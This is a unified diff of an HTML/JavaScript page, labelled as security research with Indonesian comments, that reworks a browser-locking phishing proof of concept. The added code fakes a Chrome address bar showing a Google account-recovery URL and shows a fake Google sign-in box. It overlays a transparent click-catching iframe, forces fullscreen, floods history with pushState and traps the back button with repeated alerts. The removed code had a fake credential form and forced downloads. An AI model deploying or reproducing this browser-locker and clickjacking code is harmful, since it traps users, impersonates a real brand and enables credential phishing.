@@ -3,54 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Security Research - UI Persistence</title>
+    <title>Security Research - UI Redressing</title>
     <style>
-        body { margin: 0; padding: 0; height: 500vh; background: #000; color: #0f0; font-family: monospace; overflow: hidden; }
+        body { margin: 0; padding: 0; height: 200vh; background: #000; color: #0f0; font-family: monospace; overflow: hidden; }
+        
+        /* Bar Navigasi Palsu */
         .fake-bar {
             position: fixed; top: 0; width: 100%; height: 56px;
             background: #202124; display: none; align-items: center;
-            padding: 0 15px; z-index: 10000; border-bottom: 1px solid #3c4043;
+            padding: 0 15px; z-index: 10002; border-bottom: 1px solid #3c4043;
             box-sizing: border-box; color: #e8eaed;
         }
-        #jail {
+
+        /* IFRAME TRANSPARAN (The Invisible Trap) */
+        #evilIframe {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            background: rgba(255,255,255,0.01); z-index: 9999; display: none;
+            border: none; z-index: 10001; display: none;
+            /* Set opacity ke 0.01 agar tidak terlihat tapi tetap menangkap klik */
+            opacity: 0.01; 
+            background: red; /* Hanya untuk penanda saat dev */
         }
+
         .container { padding: 20px; text-align: center; margin-top: 100px; }
         .btn-fix {
             padding: 20px 40px; background: #d93025; color: white; 
             border: none; border-radius: 5px; font-weight: bold; cursor: pointer;
         }
-        #phishContent { display: none; padding: 20px; z-index: 10001; position: relative; }
+
+        /* Apa yang DILIHAT user (Decoy) */
+        #decoyContent {
+            display: none; text-align: center; color: white; margin-top: 100px;
+            pointer-events: none; /* Penting: agar klik tembus ke iframe di atasnya */
+        }
         .login-box {
             background: white; color: black; padding: 25px; border-radius: 8px;
-            max-width: 350px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            max-width: 320px; margin: auto;
         }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
     </style>
 </head>
 <body>
 
     <div class="fake-bar" id="fakeBar">
-        <span>🔒</span> <span style="margin-left:10px; font-size: 14px;">google.com/verify-identity</span>
+        <span>🔒</span> <span style="margin-left:10px; font-size: 14px;">google.com/account-recovery</span>
     </div>
 
-    <div id="jail"></div>
+    <iframe id="evilIframe" src="about:blank"></iframe>
 
     <div class="container" id="startSection">
-        <h2>⚠ SYSTEM VULNERABILITY</h2>
-        <p>Security interaction required to continue.</p>
-        <button class="btn-fix" onclick="launchCombo()">START SECURITY PATCH</button>
+        <h2>⚠ SYSTEM ALERT</h2>
+        <p>Security verification is required to continue.</p>
+        <button class="btn-fix" onclick="launchCombo()">VERIFY NOW</button>
     </div>
 
-    <div id="phishContent">
+    <div id="decoyContent">
         <div class="login-box">
-            <h3 style="color: #d93025;">Action Required</h3>
-            <p style="font-size: 13px; color: #666;">Browser navigation is locked for your protection. Verify your account to exit.</p>
-            <input type="text" placeholder="Email or Phone">
-            <input type="password" placeholder="Enter your password">
-            <button onclick="alert('PoC: Credentials Captured.')" style="width:100%; padding:12px; background:#1a73e8; color:white; border:none; border-radius:4px; font-weight:bold;">Verify</button>
+            <h3 style="color: #d93025;">Session Expired</h3>
+            <p style="font-size: 13px; color: #666;">Please sign in to unlock your browser navigation.</p>
+            <div style="border: 1px solid #ccc; padding: 10px; margin: 10px 0; border-radius: 4px; color: #888; text-align: left;">Email or phone</div>
+            <div style="border: 1px solid #ccc; padding: 10px; margin: 10px 0; border-radius: 4px; color: #888; text-align: left;">Password</div>
+            <button style="width:100%; padding:12px; background:#1a73e8; color:white; border:none; border-radius:4px; font-weight:bold;">Next</button>
         </div>
+        <p style="margin-top: 20px; font-size: 12px; color: #555;">(Attempting to go back will re-lock the screen)</p>
     </div>
 
     <script>
@@ -61,54 +74,40 @@
             else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
         }
 
-        function triggerDownloads() {
-            // Trigger 3 download sekaligus untuk membebani UI Thread
-            for (let i = 0; i < 3; i++) {
-                const a = document.createElement("a");
-                a.href = "data:text/plain;base64,U2VjdXJpdHkgUGF0Y2ggRGF0YQ==";
-                a.download = `security_patch_${Math.random().toString(36).substring(7)}.txt`;
-                a.click();
-            }
-        }
-
         function launchCombo() {
+            // Aktifkan jebakan UI
             document.getElementById('startSection').style.display = "none";
-            document.getElementById('phishContent').style.display = "block";
+            document.getElementById('decoyContent').style.display = "block";
             document.getElementById('fakeBar').style.display = "flex";
-            document.getElementById('jail').style.display = "block";
+            document.getElementById('evilIframe').style.display = "block";
 
-            // Masuk Fullscreen
             forceFullscreen();
 
-            // History Bomb (lebih banyak biar makin berat)
+            // Kunci navigasi dengan History Bomb
             for (let i = 0; i < 100; i++) {
-                window.history.pushState({p: i}, "", "?v=" + Math.random().toString(36).substring(5));
+                window.history.pushState({p: i}, "", "?session=" + Math.random().toString(36).substring(7));
             }
 
-            alert("CRITICAL: Navigation restricted. Complete the verification below.");
-            triggerDownloads();
+            alert("Sesi navigasi Anda telah dikunci untuk keamanan.");
         }
 
-        // KUNCINYA DI SINI: Re-lock setiap kali ada interaksi atau navigasi balik
+        // Interceptor Tombol Back (The Loop)
         window.onpopstate = function() {
-            if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+            if (navigator.vibrate) navigator.vibrate(200);
             
-            // Alert ini memberikan "User Gesture" baru
-            alert("⚠️ SECURITY ALERT: Navigation blocked!\nClick OK to re-establish secure session.");
+            alert("⚠️ PERINGATAN: Navigasi diblokir!\nSelesaikan verifikasi untuk keluar.");
             
-            // Gunakan sedikit delay agar dialog Chrome tertutup dulu, baru tarik Fullscreen lagi
             setTimeout(() => {
                 forceFullscreen();
-                triggerDownloads(); // Picu lagi biar user makin bingung
-                
-                // Tambah history lagi setiap kali user coba Back
+                // Tambah amunisi history
                 for (let i = 0; i < 10; i++) {
                     window.history.pushState(null, "", "?relock=" + Date.now());
                 }
+                window.scrollTo(0, 56);
             }, 50);
         };
 
-        // Cegah Scroll ke atas agar bar asli nggak muncul secara manual
+        // Anti-Scroll manual
         window.onscroll = function() {
             if (window.pageYOffset < 50) {
                 window.scrollTo(0, 56);
